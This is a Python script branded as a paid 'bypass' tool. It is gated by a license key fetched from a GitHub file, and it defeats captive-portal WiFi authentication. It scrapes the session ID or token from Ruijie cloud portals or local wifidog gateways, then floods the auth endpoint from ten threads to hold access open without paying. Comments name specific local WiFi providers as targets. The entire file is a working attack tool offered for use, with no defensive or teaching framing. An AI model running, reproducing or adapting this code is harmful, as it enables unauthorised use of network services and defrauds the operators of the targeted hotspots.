import requests, re, urllib3, time, threading, logging, random, sys, datetime, subprocess, os, uuid, socket
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

PING_THREADS = 10
# COLOR SYSTEM
RED, GREEN, CYAN, YELLOW, MAGENTA, RESET = "\033[91m", "\033[92m", "\033[96m", "\033[93m", "\033[95m", "\033[0m"

URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

BABY_LOGO = """
[bold cyan]
      _      
    _(_)_    
   (_)@(_)   [white] <( Let's Play! )[/white]
     (_)\  / 
      /  ||  
  ___/___||___
 |____________|
[/bold cyan]"""

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]"""

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f: return f.read().strip()
        new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "MOE-998A7F92-675"

def get_current_gateway():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        gw = ".".join(s.getsockname()[0].split('.')[:-1]) + ".1"
        s.close()
        return gw
    except: return "192.168.61.1"

def check_license_hacker_style():
    my_hwid = get_hwid()
    console.clear()
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", border_style="bold cyan", expand=False)))
    user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
    if not user_key: sys.exit()
    try:
        res = requests.get(URL, timeout=10)
        for entry in res.text.splitlines():
            parts = entry.split("|")
            if user_key == parts[0].strip():
                return True
        return False
    except: return False

# ===============================
# UNIVERSAL BYPASS ENGINE
# ===============================
def start_bypass_process():
    stop_event = threading.Event()
    while not stop_event.is_set():
        try:
            session = requests.Session()
            session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
            
            r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            if r.status_code == 204:
                time.sleep(5)
                continue
            
            portal_url = r.url
            r1 = session.get(portal_url, timeout=10, verify=False)
            
            # --- SID EXTRACTION (Deep Search) ---
            params = parse_qs(urlparse(portal_url).query)
            sid = (params.get('sessionId') or params.get('token') or [None])[0]
            
            if not sid:
                sid_match = re.search(r'(?:sessionId|token)=([a-zA-Z0-9_\-]+)', r1.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                current_gw = get_current_gateway()
                # Cloud Portal (Cham Myae Thaw Tar) စစ်ဆေးခြင်း
                if "ruijienetworks.com" in portal_url or "portal-as" in portal_url:
                    auth_link = f"https://portal-as.ruijienetworks.com/api/auth/login?sessionId={sid}"
                    mode = "RUIJIE-CLOUD"
                else:
                    # Local WiFi (Zin Myo Aung, etc.)
                    auth_link = f"http://{current_gw}:2060/wifidog/auth?token={sid}"
                    mode = "LOCAL-BYPASS"

                def pulse():
                    while True:
                        try:
                            session.get(auth_link, timeout=10, verify=False)
                            sys.stdout.write(f"{GREEN}[✓] {mode} | SID: {sid[:10]}... | ACTIVE{RESET}\n")
                            sys.stdout.flush()
                        except: pass
                        time.sleep(0.1)

                for _ in range(PING_THREADS):
                    threading.Thread(target=pulse, daemon=True).start()
                
                while session.get("http://www.google.com", timeout=5).status_code == 200:
                    time.sleep(15)
            else:
                sys.stdout.write(f"{RED}[-] TARGET SID NOT FOUND. RETRYING...{RESET}\n")
                time.sleep(3)
        except: time.sleep(5)

if __name__ == "__main__":
    if check_license_hacker_style():
        console.print(Panel.fit("[bold red]🔥 MOE YU BYPASS PRO v7.8 IS RUNNING 🔥[/bold red]", border_style="white"))
        start_bypass_process()
    else:
        print(f"{RED}INVALID KEY!{RESET}")
